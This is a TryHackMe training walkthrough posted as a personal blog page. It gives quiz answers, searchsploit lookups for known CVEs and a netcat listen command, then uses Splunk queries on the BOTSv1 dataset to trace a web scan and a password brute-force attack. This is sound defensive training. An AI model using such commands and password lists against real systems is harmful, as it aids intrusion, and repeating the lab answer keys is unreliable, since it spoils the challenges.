@@ -1,0 +1,1583 @@
+<!DOCTYPE html><html lang="en-US" mode="light" ><head> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-179830187-1"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-179830187-1'); </script><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-proxy-endpoint" content="https://myochosite-291718.appspot.com/query?id=ahNwfm15b2Nob3NpdGUtMjkxNzE4chULEghBcGlRdWVyeRiAgIDo14eBCgw"><meta name="pv-cache-path" content="/true"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Lab - TryHackMe - Entry Walkthrough" /><meta property="og:locale" content="en_US" /><meta name="description" content="Learning Path" /><meta property="og:description" content="Learning Path" /><link rel="canonical" href="https://ocholuo.github.io//posts/TryHackMe-EntryWalkthrough/" /><meta property="og:url" content="https://ocholuo.github.io//posts/TryHackMe-EntryWalkthrough/" /><meta property="og:site_name" content="Grace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-08T10:11:11-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Lab - TryHackMe - Entry Walkthrough" /><meta name="twitter:site" content="@twitter_username" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Learning Path","headline":"Lab - TryHackMe - Entry Walkthrough","dateModified":"2020-11-28T12:18:19-05:00","url":"https://ocholuo.github.io//posts/TryHackMe-EntryWalkthrough/","datePublished":"2020-11-08T10:11:11-05:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://ocholuo.github.io//posts/TryHackMe-EntryWalkthrough/"},"@context":"https://schema.org"}</script><title>Lab - TryHackMe - Entry Walkthrough | Grace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Grace"><meta name="application-name" content="Grace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://myochosite-291718.appspot.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://myochosite-291718.appspot.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/npm/countup.js@1.9.3/dist/countUp.min.js"></script> <script async src="/assets/js/dist/pvreport.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-179830187-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-179830187-1'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/sample/rabbit.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Grace</a></div><div class="site-subtitle font-italic">2021 Jun 22 updated</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/ocholuo" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Lab - TryHackMe - Entry Walkthrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Lab - TryHackMe - Entry Walkthrough</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Grace JyL </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Nov 8, 2020, 10:11 AM -0500" prep="on" > Nov 8, 2020 <i class="unloaded">2020-11-08T10:11:11-05:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Nov 28, 2020, 12:18 PM -0500" prefix="Updated " > Nov 28, 2020 <i class="unloaded">2020-11-28T12:18:19-05:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="5540 words">30 min</span> <span id="pv" class="pageviews"><i class="fas fa-spinner fa-spin fa-fw"></i></span></div></div><div class="post-content"><p>[toc]</p><hr /><h1 id="tryhackme---entry-walkthrough">TryHackMe - Entry Walkthrough</h1><div class="table-wrapper"><table><thead><tr><th>Hacktivities<th>Goal<tbody><tr><td>Starting Out In Cyber Sec<td>path<tr><td>Tutorial<td>how to use and get started with TryHackMe<tr><td>Introductory Researching<td><code class="language-plaintext highlighter-rouge">kali$ searchsploit sofetware</code><tr><td>Splunk<td>Splunk commands<tr><td>Basic Pentesting<td>user privilege escalation<tr><td>Malware Introductory<td>Malware analysis</table></div><hr /><h1 id="thm---starting-out-in-cyber-sec">THM - Starting Out In Cyber Sec</h1><hr /><h1 id="thm---tutorial">THM - Tutorial</h1><ol><li>setup the VPN<li>run the ip</ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/gV0XlFA.png" alt="Screen Shot 2020-11-07 at 16.32.03" /></p><hr /><h1 id="thm---introductory-researching">THM - Introductory Researching</h1><p>task 2:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="c">#1 In the Burp Suite Program that ships with Kali Linux, what mode would you use to manually send a request (often repeating a captured request numerous times)?</span>
+repeater
+
+
+<span class="c">#2 What hash format are modern Windows login passwords stored in?</span>
+NTLM
+
+<span class="c">#3 What are automated tasks called in Linux?</span>
+cron <span class="nb">jobs</span>
+
+<span class="c">#4 What number base could you use as a shorthand for base 2 (binary)?</span>
+base 16
+
+<span class="c">#5 If a password hash starts with $6$, what format is it (Unix variant)?</span>
+Sha512crypt
+</pre></table></code></div></div><p>task 3:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre><td class="rouge-code"><pre><span class="c">#1 What is the CVE for the 2020 Cross-Site Scripting (XSS) vulnerability found in WPForms?</span>
+CVE-2020-10385
+
+kali@kali:~<span class="nv">$ </span>searchsploit WPForms
+<span class="nt">------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                  |  Path
+<span class="nt">------------------------------------------------</span> <span class="nt">---------------------------------</span>
+WordPress Plugin WPForms 1.5.8.2 - Persistent C | php/webapps/48245.txt
+<span class="nt">------------------------------------------------</span> <span class="nt">---------------------------------</span>
+
+
+
+<span class="c">#2 There was a Local Privilege Escalation vulnerability found in the Debian version of Apache Tomcat, back in 2016. What's the CVE for this vulnerability?</span>
+CVE-2016-1240
+
+kali@kali:~<span class="nv">$ </span>searchsploit Apache Tomcat  2016
+
+
+
+<span class="c">#3 What is the very first CVE found in the VLC media player?</span>
+CVE-2007-0017
+
+
+<span class="c">#4 If I wanted to exploit a 2020 buffer overflow in the sudo program, which CVE would I use?</span>
+CVE-2019-18634
+
+kali@kali:~<span class="nv">$ </span>searchsploit <span class="nb">sudo </span>2020
+
+</pre></table></code></div></div><p>Manual Pages:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="c">#1 SCP is a tool used to copy files from one computer to another.What switch would you use to copy an entire directory?</span>
+<span class="nt">-r</span>
+
+<span class="c">#2 fdisk is a command used to view and alter the partitioning scheme used on your hard drive.What switch would you use to list the current partitions?</span>
+<span class="nt">-l</span>
+
+<span class="c">#3 nano is an easy-to-use text editor for Linux. There are arguably better editors (Vim, being the obvious choice); however, nano is a great one to start with.What switch would you use to make a backup when opening a file with nano?</span>
+<span class="nt">-B</span>
+
+<span class="c">#4 Netcat is a basic tool used to manually send and receive network requests. What command would you use to start netcat in listen mode, using port 12345?</span>
+nc <span class="nt">-l</span> <span class="nt">-p</span> 12345
+
+</pre></table></code></div></div><hr /><h1 id="thm---splunk">THM - Splunk</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+</pre><td class="rouge-code"><pre>
+<span class="c">#1 Splunk queries always begin with this command implicitly unless otherwise specified. What command is this? When performing additional queries to refine received data this command must be added at the start. This is a prime example of a slight trick question.</span>
+search
+
+<span class="c">#2 When searching for values, its fairly typical within security to look for uncommon events. What command can we include within our search to find these?rare</span>
+
+<span class="c">#3 What about the inverse? What if we want the most common security event?</span>
+top
+
+<span class="c">#4 When we import data into splunk, what is it stored under?</span>
+index
+
+<span class="c">#5 We can create 'views' that allow us to consistently pull up the same search over and over again; what are these called?</span>
+dashboard
+
+<span class="c">#6 Importing data doesnt always go as planned and we can sometimes end up with multiple copies of the same data, what command do we include in our search to remove these copies?</span>
+dedup
+
+<span class="c">#7 Splunk can be used for more than just a SIEM and its commonly used in marketing to track things such as how long a shopping trip on a website lasts from start to finish. What command can we include in our search to track how long these event pairs take?</span>
+transaction
+
+<span class="c">#8 'pipe' search results into further commands, what character do we use for this?</span>
+|
+
+<span class="c">#9 In performing data analytics with Splunk (ironically what the tool is at its core) its useful to track occurrences of events over time, what command do we include to plot this?</span>
+timechart
+
+<span class="c">#10 gather general statistical information about a search?</span>
+stats
+
+<span class="c">#11 Data imported into Splunk is categorized into columns called what?</span>
+fields
+
+<span class="c">#12 When we import data into Splunk we can view its point of origination, what is this called? Im looking for the machine aspect of this here.</span>
+host
+
+<span class="c">#13 When we import data into Splunk we can view its point of origination from within a system, what is this called?</span>
+<span class="nb">source</span>
+
+<span class="c">#14 We can classify these points of origination and group them all together, viewing them as their specific type. What is this called? Use the syntax found within the search query rather than the proper name for this.</span>
+sourcetype
+
+<span class="c">#15 When performing functions on data we are searching through we use a specific command prior to the evaluation itself, what is this command?</span>
+<span class="nb">eval</span>
+
+<span class="c">#16 Love it or hate it regular expression is a massive component to Splunk, what command do we use to specific regex within a search?</span>
+rex
+
+<span class="c">#17 Its fairly common to create subsets and specific views for less technical Splunk users, what are these called?</span>
+pivot tables
+
+<span class="c">#18 What is the proper name of the time date field in Splunk</span>
+_time
+
+<span class="c">#19 How do I specifically include only the first few values found within my search?</span>
+<span class="nb">head</span>
+
+<span class="c">#20 More useful than you would otherwise imagine, how do I flip the order that results are returned in?</span>
+reverse
+
+<span class="c">#21 When viewing search results, its often useful to rename fields using user-provided tables of values. What command do we include within a search to do this?</span>
+lookup
+
+<span class="c">#22 We can collect events into specific time frames to be used in further processing. What command do we include within a search to do just that?</span>
+bucket
+
+<span class="c">#23 We can also define data into specific sections of time to be used within chart commands, what command do we use to set these lengths of time? This is different from the previous question as we are no longer collecting for further processing.</span>
+span
+
+<span class="c">#24 When producing statistics regarding a search its common to number the occurrences of an event, what command do we include to do this?</span>
+count
+
+<span class="c">#25 Last but not least, what is the website where you can find the Splunk apps at?</span>
+splunkbase.splunk.com
+
+<span class="c">#26 We can also add new features into Splunk, what are these called?</span>
+apps
+
+<span class="c">#27 What does SOC stand for?</span>
+security operations center
+
+<span class="c">#28 What does SIEM stand for?</span>
+security information and event management
+
+<span class="c">#29 How about BOTS?</span>
+boss of the soc
+
+<span class="c">#30 And CIM?</span>
+common information model
+
+<span class="c">#31 what is the website where you can find the Splunk forums at?</span>
+answers.splunk.com
+</pre></table></code></div></div><p>Advanced Persistent Threat</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237
+238
+239
+240
+241
+242
+243
+244
+245
+246
+247
+248
+249
+250
+251
+252
+253
+254
+255
+256
+257
+258
+259
+260
+261
+262
+263
+264
+265
+266
+267
+268
+269
+270
+271
+272
+273
+274
+275
+276
+277
+278
+279
+280
+281
+282
+283
+284
+285
+286
+287
+288
+289
+290
+291
+292
+293
+294
+295
+296
+297
+298
+299
+300
+301
+302
+303
+304
+305
+306
+307
+308
+309
+310
+311
+312
+313
+314
+315
+316
+317
+318
+319
+320
+321
+322
+323
+324
+325
+326
+327
+328
+329
+330
+331
+332
+333
+334
+335
+336
+337
+338
+339
+340
+341
+342
+343
+344
+345
+346
+347
+348
+349
+350
+351
+</pre><td class="rouge-code"><pre><span class="c">#1 What IP is scanning our web server?</span>
+<span class="k">*</span> | stats count by index
+<span class="c"># index	count</span>
+<span class="c"># botsv1	955807</span>
+<span class="c"># main	5932</span>
+
+<span class="k">*</span> <span class="nv">index</span><span class="o">=</span>main
+| stats count by <span class="nb">source</span>
+| <span class="nb">sort</span> <span class="nt">-count</span>
+<span class="c"># source	count</span>
+<span class="c"># stream:Splunk_HTTPURI	3708</span>
+<span class="c"># stream:Splunk_HTTPStatus	686</span>
+<span class="c"># stream:Splunk_HTTPClient	429</span>
+<span class="c"># stream:Splunk_HTTPResponseTime	429</span>
+<span class="c"># stream:Splunk_IP	247</span>
+<span class="c"># stream:Splunk_Tcp	237</span>
+<span class="c"># stream:Splunk_Udp	79</span>
+<span class="c"># stream:Splunk_DNSIntegrity	40</span>
+<span class="c"># stream:Splunk_DNSClientQueryTypes	36</span>
+<span class="c"># stream:Splunk_DNSRequestResponse	23</span>
+<span class="c"># stream:Splunk_DNSServerQuery	23</span>
+<span class="c"># stream:Splunk_DNSServerResponse	23</span>
+
+<span class="k">*</span> <span class="nv">index</span><span class="o">=</span>botsv1
+| stats count by <span class="nb">source</span>
+| <span class="nb">sort</span> <span class="nt">-count</span>
+| <span class="nb">head </span>10
+<span class="c"># source	count</span>
+<span class="c"># WinEventLog:Microsoft-Windows-Sysmon/Operational	270597</span>
+<span class="c"># stream:smb	151568</span>
+<span class="c"># /var/log/suricata/eve.json	125584</span>
+<span class="c"># WinEventLog:Security	87430</span>
+<span class="c"># udp:514	80922</span>
+<span class="c"># WinRegistry	74720</span>
+<span class="c"># stream:ip	62083</span>
+<span class="c"># stream:tcp	28291</span>
+<span class="c"># stream:http	23936</span>
+<span class="c"># C:3SVC1\u_ex160810.log	22401</span>
+
+<span class="nv">index</span><span class="o">=</span>botsv1 imreallynotbatman.com <span class="nv">sourcetype</span><span class="o">=</span>stream:http
+| stats count by src_ip
+| <span class="nb">sort</span> <span class="nt">-count</span>
+<span class="c"># src_ip	count</span>
+<span class="c"># 40.80.148.42	20932</span>
+<span class="c"># 23.22.63.114	1236</span>
+Answer: 40.80.148.42
+
+
+
+
+<span class="c">#2 What web scanner scanned the server?</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 imreallynotbatman.com <span class="nv">sourcetype</span><span class="o">=</span>stream:http <span class="nv">src_ip</span><span class="o">=</span><span class="s2">"40.80.148.42"</span>
+| stats count by  src_headers
+| <span class="nb">sort</span> <span class="nt">-count</span>
+| <span class="nb">head </span>3
+<span class="c"># Top 3 requests should Acunetix (Free Edition) scanning requests:</span>
+<span class="c"># POST /joomla/index.php/component/search/ HTTP/1.1</span>
+<span class="c"># Content-Length: 99</span>
+<span class="c"># Content-Type: application/x-www-form-urlencoded</span>
+<span class="c"># Cookie: ae72c62a4936b238523950a4f26f67d0=v7ikb3m59romokqmbiet3vphv3</span>
+<span class="c"># Host: imreallynotbatman.com</span>
+<span class="c"># Connection: Keep-alive</span>
+<span class="c"># Accept-Encoding: gzip,deflate</span>
+<span class="c"># User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21</span>
+<span class="c"># Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - Free Edition)</span>
+<span class="c"># Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED</span>
+<span class="c"># Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm</span>
+<span class="c"># Accept: */*</span>
+
+Asnwer: acunetix
+
+
+
+<span class="c">#3 What is the IP address of our web server?</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 imreallynotbatman.com <span class="nv">sourcetype</span><span class="o">=</span>stream:http <span class="nv">src_ip</span><span class="o">=</span><span class="s2">"40.80.148.42"</span>
+| stats count by dest_ip
+| <span class="nb">sort</span> <span class="nt">-count</span>
+<span class="c"># dest_ip	count</span>
+<span class="c"># 192.168.250.70	20931</span>
+<span class="c"># 192.168.250.40	1</span>
+
+
+
+<span class="c">#4 What content management system is imreallynotbatman.com using?</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 imreallynotbatman.com <span class="nv">sourcetype</span><span class="o">=</span>stream:http <span class="nv">src_ip</span><span class="o">=</span><span class="s2">"40.80.148.42"</span>
+| stats count by uri
+| <span class="nb">sort</span> <span class="nt">-count</span>
+| <span class="nb">head </span>10
+<span class="c"># uri	count</span>
+<span class="c"># /joomla/index.php/component/search/	14218</span>
+<span class="c"># /joomla/index.php	798</span>
+<span class="c"># /	517</span>
+<span class="c"># /windows/win.ini	33</span>
+<span class="c"># /joomla/media/jui/js/jquery-migrate.min.js	18</span>
+<span class="c"># /joomla/media/jui/js/jquery-noconflict.js	18</span>
+<span class="c"># /joomla/administrator/index.php	17</span>
+<span class="c"># /joomla/media/jui/js/bootstrap.min.js	17</span>
+<span class="c"># /joomla/media/system/js/html5fallback.js	13</span>
+<span class="c"># /joomla/templates/protostar/js/template.js	13</span>
+
+Answer: joomla
+
+
+
+<span class="c">#5 What address is performing the brute-forcing attack against our website?</span>
+
+<span class="nv">index</span><span class="o">=</span>botsv1 imreallynotbatman.com <span class="nv">sourcetype</span><span class="o">=</span>stream:http <span class="nv">src_ip</span><span class="o">=</span><span class="s2">"40.80.148.42"</span>
+| stats count by http_method
+| <span class="nb">sort</span> <span class="nt">-count</span>
+<span class="c"># http_method	count</span>
+<span class="c"># POST	15146</span>
+<span class="c"># GET	5766</span>
+<span class="c"># OPTIONS	5</span>
+<span class="c"># CONNECT	1</span>
+<span class="c"># PROPFIND	1</span>
+<span class="c"># TRACE	1</span>
+
+<span class="c"># A brute force attack involves POST requests.</span>
+<span class="c"># In addition, it involves a username and a password.</span>
+<span class="c"># identify one of the requests:</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 imreallynotbatman.com <span class="nv">sourcetype</span><span class="o">=</span>stream:http <span class="nv">src_ip</span><span class="o">=</span><span class="s2">"40.80.148.42"</span> <span class="nv">http_method</span><span class="o">=</span><span class="s2">"POST"</span> username
+| table dest_content
+| <span class="nb">head </span>1
+<span class="c"># Result:</span>
+<span class="c"># [REDACTED]</span>
+<span class="c"># &lt;form action="/joomla/administrator/index.php" method="post" id="form-login" class="form-inline"&gt;</span>
+<span class="c">#     [REDACTED]</span>
+<span class="c">#     &lt;input name="username" tabindex="1" id="mod-login-username" type="text" class="input-medium" placeholder="Username" size="15" autofocus="true" /&gt;</span>
+<span class="c">#     [REDACTED]</span>
+<span class="c">#     &lt;input name="passwd" tabindex="2" id="mod-login-password" type="password" class="input-medium" placeholder="Password" size="15"/&gt;</span>
+<span class="c">#     [REDACTED]</span>
+<span class="c">#     &lt;button tabindex="3" class="btn btn-primary btn-block btn-large"&gt;</span>
+<span class="c">#         &lt;span class="icon-lock icon-white"&gt;&lt;/span&gt; Log in                   &lt;/button&gt;</span>
+<span class="c">#     [REDACTED]</span>
+<span class="c">#     &lt;input type="hidden" name="option" value="com_login"/&gt;</span>
+<span class="c">#     &lt;input type="hidden" name="task" value="login"/&gt;</span>
+<span class="c">#     &lt;input type="hidden" name="return" value="aW5kZXgucGhw"/&gt;</span>
+<span class="c">#     &lt;input type="hidden" name="da4c70bcedf77f722881e18fb076b963" value="1" /&gt;   &lt;/fieldset&gt;</span>
+<span class="c"># &lt;/form&gt;</span>
+<span class="c"># [REDACTED]</span>
+
+<span class="c"># see the structure of the authentication form; it is composed of a username field, a passwd field and a login field.</span>
+<span class="c"># search for POST requests involving the username and passwd fields:</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 imreallynotbatman.com <span class="nv">sourcetype</span><span class="o">=</span>stream:http <span class="nv">http_method</span><span class="o">=</span><span class="s2">"POST"</span> <span class="nv">form_data</span><span class="o">=</span><span class="k">*</span>username<span class="k">*</span>passwd<span class="k">*</span>
+| stats count by src_ip
+<span class="c"># src_ip	count</span>
+<span class="c"># 23.22.63.114	412</span>
+<span class="c"># 40.80.148.42	1</span>
+<span class="c"># 1 request from 40.80.148.42 vs. 412 requests from 23.22.63.114. The brute force attack is coming from this latest.</span>
+
+Answer: 23.22.63.114
+
+
+
+
+<span class="c">#6 What was the first password attempted in the attack?</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 imreallynotbatman.com <span class="nv">sourcetype</span><span class="o">=</span>stream:http <span class="nv">http_method</span><span class="o">=</span><span class="s2">"POST"</span> <span class="nv">form_data</span><span class="o">=</span><span class="k">*</span>username<span class="k">*</span>passwd<span class="k">*</span>
+| rex <span class="nv">field</span><span class="o">=</span>form_data <span class="s2">"username=(?&lt;u&gt;</span><span class="se">\w</span><span class="s2">+)"</span>
+| rex <span class="nv">field</span><span class="o">=</span>form_data <span class="s2">"passwd=(?&lt;p&gt;</span><span class="se">\w</span><span class="s2">+)"</span>
+| table _time, u, p
+| <span class="nb">sort </span>by _time
+| <span class="nb">head </span>5
+<span class="c"># Results:</span>
+<span class="c"># _time	u	p</span>
+<span class="c"># 2016-08-10 21:45:21.226	admin	12345678</span>
+<span class="c"># 2016-08-10 21:45:21.241	admin	letmein</span>
+<span class="c"># 2016-08-10 21:45:21.247	admin	qwerty</span>
+<span class="c"># 2016-08-10 21:45:21.250	admin	1234</span>
+<span class="c"># 2016-08-10 21:45:21.260	admin	123456</span>
+Answer: 12345678
+
+
+
+
+<span class="c">#7 One of the passwords in the brute force attack is James Brodsky's favorite Coldplay song. Which six character song is it?</span>
+<span class="c"># Go to https://en.wikipedia.org/wiki/List_of_songs_recorded_by_Coldplay and copy the table.</span>
+<span class="c"># Extract all the songs names (1st column) and save the file as coldplay.csv.</span>
+<span class="c"># Now in Splunk, go to ‘Settings &gt; Lookups &gt; Lookup table files &gt; Add New’.</span>
+<span class="c"># Enter the following search to check that your file has successfully been imported:</span>
+| inputlookup coldplay.csv
+<span class="c"># Now, search for a common value</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="nv">sourcetype</span><span class="o">=</span>stream:http <span class="nv">form_data</span><span class="o">=</span><span class="k">*</span>username<span class="k">*</span>passwd<span class="k">*</span>
+| rex <span class="nv">field</span><span class="o">=</span>form_data <span class="s2">"passwd=(?&lt;userpassword&gt;</span><span class="se">\w</span><span class="s2">+)"</span>
+| <span class="nb">eval </span><span class="nv">lenpword</span><span class="o">=</span>len<span class="o">(</span>userpassword<span class="o">)</span>
+| search <span class="nv">lenpword</span><span class="o">=</span>6
+| <span class="nb">eval </span><span class="nv">password</span><span class="o">=</span>lower<span class="o">(</span>userpassword<span class="o">)</span>
+| lookup coldplay.csv song as password OUTPUTNEW song
+| search <span class="nv">song</span><span class="o">=</span><span class="k">*</span>
+| table song
+Answer: yellow
+
+
+
+<span class="c">#8 What was the correct password for admin access to the content management system running imreallynotbatman.com?</span>
+<span class="c"># Upon discovering a seemingly correct password, a password brute-forcing engine such as hydra will enter the password a second time to verify that it works.</span>
+<span class="c"># count the number of occurences for each password, and extract the one(s) with at least 2 occurences.</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 imreallynotbatman.com <span class="nv">sourcetype</span><span class="o">=</span>stream:http <span class="nv">http_method</span><span class="o">=</span><span class="s2">"POST"</span> <span class="nv">form_data</span><span class="o">=</span><span class="k">*</span>username<span class="k">*</span>passwd<span class="k">*</span>
+| rex <span class="nv">field</span><span class="o">=</span>form_data <span class="s2">"passwd=(?&lt;p&gt;</span><span class="se">\w</span><span class="s2">+)"</span>
+| stats count by p
+| where count&gt;1
+| table p
+
+Result: batman
+
+
+
